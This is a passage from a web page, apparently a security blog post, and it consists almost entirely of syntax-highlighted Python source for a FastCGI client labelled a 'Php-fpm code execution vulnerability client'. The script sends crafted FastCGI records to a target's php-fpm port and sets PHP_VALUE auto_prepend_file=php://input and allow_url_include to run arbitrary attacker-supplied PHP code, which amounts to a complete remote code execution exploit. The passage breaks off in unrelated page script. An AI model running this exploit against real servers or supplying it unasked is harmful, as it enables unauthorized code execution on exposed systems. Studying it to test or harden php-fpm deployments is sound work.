class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">else</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">bchr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> PY2<span class="token punctuation">:</span>        <span class="token keyword">return</span> force_bytes<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> bytes<span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>c<span class="token punctuation">,</span> int<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> c    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> ord<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>s<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_text</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> issubclass<span class="token punctuation">(</span>type<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> s    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>s<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> str<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> str<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">class</span> <span class="token class-name">FastCGIClient</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A Fast-CGI Client for Python"""</span>    <span class="token comment" spellcheck="true"># private</span>    __FCGI_VERSION <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_ROLE_RESPONDER <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_ROLE_AUTHORIZER <span class="token operator">=</span> <span class="token number">2</span>    __FCGI_ROLE_FILTER <span class="token operator">=</span> <span class="token number">3</span>    __FCGI_TYPE_BEGIN <span class="token operator">=</span> <span class="token number">1</span>    __FCGI_TYPE_ABORT <span class="token operator">=</span> <span class="token number">2</span>    __FCGI_TYPE_END <span class="token operator">=</span> <span class="token number">3</span>    __FCGI_TYPE_PARAMS <span class="token operator">=</span> <span class="token number">4</span>    __FCGI_TYPE_STDIN <span class="token operator">=</span> <span class="token number">5</span>    __FCGI_TYPE_STDOUT <span class="token operator">=</span> <span class="token number">6</span>    __FCGI_TYPE_STDERR <span class="token operator">=</span> <span class="token number">7</span>    __FCGI_TYPE_DATA <span class="token operator">=</span> <span class="token number">8</span>    __FCGI_TYPE_GETVALUES <span class="token operator">=</span> <span class="token number">9</span>    __FCGI_TYPE_GETVALUES_RESULT <span class="token operator">=</span> <span class="token number">10</span>    __FCGI_TYPE_UNKOWNTYPE <span class="token operator">=</span> <span class="token number">11</span>    __FCGI_HEADER_SIZE <span class="token operator">=</span> <span class="token number">8</span>    <span class="token comment" spellcheck="true"># request state</span>    FCGI_STATE_SEND <span class="token operator">=</span> <span class="token number">1</span>    FCGI_STATE_ERROR <span class="token operator">=</span> <span class="token number">2</span>    FCGI_STATE_SUCCESS <span class="token operator">=</span> <span class="token number">3</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> timeout<span class="token punctuation">,</span> keepalive<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>host <span class="token operator">=</span> host        self<span class="token punctuation">.</span>port <span class="token operator">=</span> port        self<span class="token punctuation">.</span>timeout <span class="token operator">=</span> timeout        <span class="token keyword">if</span> keepalive<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>keepalive <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> None        self<span class="token punctuation">.</span>requests <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__connect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span>self<span class="token punctuation">.</span>timeout<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># if self.keepalive:</span>        <span class="token comment" spellcheck="true">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span>        <span class="token comment" spellcheck="true"># else:</span>        <span class="token comment" spellcheck="true">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> msg<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>sock <span class="token operator">=</span> None            <span class="token keyword">print</span><span class="token punctuation">(</span>repr<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">__encodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> fcgi_type<span class="token punctuation">,</span> content<span class="token punctuation">,</span> requestid<span class="token punctuation">)</span><span class="token punctuation">:</span>        length <span class="token operator">=</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        buf <span class="token operator">=</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_VERSION<span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>fcgi_type<span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>requestid <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>requestid <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>length <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span>length <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \               <span class="token operator">+</span> content        <span class="token keyword">return</span> buf    <span class="token keyword">def</span> <span class="token function">__encodeNameValueParams</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        nLen <span class="token operator">=</span> len<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        vLen <span class="token operator">=</span> len<span class="token punctuation">(</span>value<span class="token punctuation">)</span>        record <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">if</span> nLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>nLen<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>nLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>nLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> vLen <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span>vLen<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">+=</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token punctuation">(</span>vLen <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> \                      <span class="token operator">+</span> bchr<span class="token punctuation">(</span>vLen <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> record <span class="token operator">+</span> name <span class="token operator">+</span> value    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIHeader</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'version'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        header<span class="token punctuation">[</span><span class="token string">'reserved'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bord<span class="token punctuation">(</span>stream<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> header    <span class="token keyword">def</span> <span class="token function">__decodeFastCGIRecord</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">:</span>        header <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>int<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__FCGI_HEADER_SIZE<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> header<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            record <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIHeader<span class="token punctuation">(</span>header<span class="token punctuation">)</span>            record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">''</span>            <span class="token keyword">if</span> <span class="token string">'contentLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                contentLength <span class="token operator">=</span> int<span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                record<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>contentLength<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'paddingLength'</span> <span class="token keyword">in</span> record<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                skiped <span class="token operator">=</span> buffer<span class="token punctuation">.</span>read<span class="token punctuation">(</span>int<span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> record    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nameValuePairs<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> post<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>__connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'connect failure! please check your fasctcgi-server !!'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        requestId <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span> <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>        request <span class="token operator">=</span> b<span class="token string">""</span>        beginFCGIRecordContent <span class="token operator">=</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_ROLE_RESPONDER<span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span>self<span class="token punctuation">.</span>keepalive<span class="token punctuation">)</span> \                                 <span class="token operator">+</span> bchr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_BEGIN<span class="token punctuation">,</span>                                              beginFCGIRecordContent<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        paramsRecord <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">if</span> nameValuePairs<span class="token punctuation">:</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token keyword">in</span> nameValuePairs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                name <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>name<span class="token punctuation">)</span>                value <span class="token operator">=</span> force_bytes<span class="token punctuation">(</span>value<span class="token punctuation">)</span>                paramsRecord <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeNameValueParams<span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span>        <span class="token keyword">if</span> paramsRecord<span class="token punctuation">:</span>            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> paramsRecord<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_PARAMS<span class="token punctuation">,</span> b<span class="token string">''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        <span class="token keyword">if</span> post<span class="token punctuation">:</span>            request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> force_bytes<span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        request <span class="token operator">+=</span> self<span class="token punctuation">.</span>__encodeFastCGIRecord<span class="token punctuation">(</span>FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDIN<span class="token punctuation">,</span> b<span class="token string">''</span><span class="token punctuation">,</span> requestId<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SEND        self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>__waitForResponse<span class="token punctuation">(</span>requestId<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__waitForResponse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> requestId<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> b<span class="token string">''</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            buf <span class="token operator">=</span> self<span class="token punctuation">.</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> len<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            data <span class="token operator">+=</span> buf        data <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> self<span class="token punctuation">.</span>__decodeFastCGIRecord<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> response<span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDOUT \                    <span class="token operator">or</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>                <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>__FCGI_TYPE_STDERR<span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_ERROR                <span class="token keyword">if</span> requestId <span class="token operator">==</span> int<span class="token punctuation">(</span>response<span class="token punctuation">[</span><span class="token string">'requestId'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> response<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> FastCGIClient<span class="token punctuation">.</span>FCGI_STATE_SUCCESS<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>requests<span class="token punctuation">[</span>requestId<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'response'</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"fastcgi connect host:{} port:{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Php-fpm code execution vulnerability client.'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'host'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'Target host, such as 127.0.0.1'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--code'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'What php code your want to execute'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'&lt;?php phpinfo(); exit; ?>'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> <span class="token string">'--port'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'FastCGI port'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">9000</span><span class="token punctuation">,</span> type<span class="token operator">=</span>int<span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    client <span class="token operator">=</span> FastCGIClient<span class="token punctuation">(</span>args<span class="token punctuation">.</span>host<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    params <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    documentRoot <span class="token operator">=</span> <span class="token string">"/"</span>    uri <span class="token operator">=</span> args<span class="token punctuation">.</span>file    content <span class="token operator">=</span> args<span class="token punctuation">.</span>code    params <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'GATEWAY_INTERFACE'</span><span class="token punctuation">:</span> <span class="token string">'FastCGI/1.0'</span><span class="token punctuation">,</span>        <span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        <span class="token string">'SCRIPT_FILENAME'</span><span class="token punctuation">:</span> documentRoot <span class="token operator">+</span> uri<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'SCRIPT_NAME'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>        <span class="token string">'QUERY_STRING'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>        <span class="token string">'REQUEST_URI'</span><span class="token punctuation">:</span> uri<span class="token punctuation">,</span>        <span class="token string">'DOCUMENT_ROOT'</span><span class="token punctuation">:</span> documentRoot<span class="token punctuation">,</span>        <span class="token string">'SERVER_SOFTWARE'</span><span class="token punctuation">:</span> <span class="token string">'php/fcgiclient'</span><span class="token punctuation">,</span>        <span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'REMOTE_PORT'</span><span class="token punctuation">:</span> <span class="token string">'9985'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_ADDR'</span><span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_PORT'</span><span class="token punctuation">:</span> <span class="token string">'80'</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_NAME'</span><span class="token punctuation">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>        <span class="token string">'SERVER_PROTOCOL'</span><span class="token punctuation">:</span> <span class="token string">'HTTP/1.1'</span><span class="token punctuation">,</span>        <span class="token string">'CONTENT_TYPE'</span><span class="token punctuation">:</span> <span class="token string">'application/text'</span><span class="token punctuation">,</span>        <span class="token string">'CONTENT_LENGTH'</span><span class="token punctuation">:</span> <span class="token string">"%d"</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'PHP_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'auto_prepend_file = php://input'</span><span class="token punctuation">,</span>        <span class="token string">'PHP_ADMIN_VALUE'</span><span class="token punctuation">:</span> <span class="token string">'allow_url_include = On'</span>    <span class="token punctuation">}</span>    response <span class="token operator">=</span> client<span class="token punctuation">.</span>request<span class="token punctuation">(</span>params<span class="token punctuation">,</span> content<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>force_text<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              